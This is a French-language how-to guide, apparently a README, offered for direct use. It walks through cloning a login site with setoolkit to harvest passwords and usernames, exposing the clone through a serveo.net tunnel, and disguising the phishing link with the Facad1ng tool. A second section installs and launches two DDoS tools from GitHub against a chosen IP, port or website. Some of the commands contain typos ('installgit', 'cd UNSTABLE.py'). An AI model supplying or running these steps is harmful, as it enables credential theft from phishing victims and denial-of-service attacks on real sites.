
### linux hack faux site : mots de passe et identifiant repris 
cela va servir a cloner un site parfaitement attention les site avec le code source chiffré notament js et python auront des erreur au clonage 
copier toutes les commande une aune dans le terminal linux :  
 
## Installation

### Mettre à jour le système

```bash
sudo apt update
sudo apt upgrade -y
```
### Ouvrir le tool

```bash
clear
sudo setoolkit
``` 
puis choisissez 1,2,3 et l option 2  
entrer ton ipv4 :  
puis choisis un site que tu veux cloner  

### creer un lien serveur local

```bash
ssh -R 80:localhost:80 serveo.net -y
```
note le lien  
### Cloner le dépôt

```bash
git clone https://github.com/spyboy-productions/Facad1ng
cd Facad1ng
```

### Créer un environnement virtuel

```bash
python3 -m venv venv
source venv/bin/activate
```

### Installer les dépendances

```bash
clear
pip3 install -r requirements.txt
```

### Lancer le programme

```bash
python3 Facad1ng.py
```
copie colle ton url que tu as noté  
dans mots clé choisis login  
puis choisis un des lien proposer 

### nouveau hack : attack ddos  unstable + ultra ddos (deux terminal linux)

commande a mettre dans kali linux pour ultra ddos et unstable : 
````bash
sudo apt update
sudo apt upgrade
````
ensuite :  
````bash
sudo apt installgit python3 python3-pip
pip3 install --break-system-packages pysocks bs4 scapy-python3
````
cloner le repot pour ultra ddos:  
````bash
git clone https://github.com/mishakorzik/Ultra-DDos
````
pour unstable :
````bash
git clone https://github.com/iJoshoa/UnstableDDoS
````
ouvrir et lancer pour ultra ddos:  
````bash
cd Ultra-DDos
python2 main.py
````
pour unstable :
````bash
 cd UNSTABLE.py
python UNSTABLE.py
````
si un probleme pour ulra ddos:
````bash
pip install --break-system-packages user-agent
````
vous pouvez lancer une attack ddos sur une ip avec son port ,sur un site web  
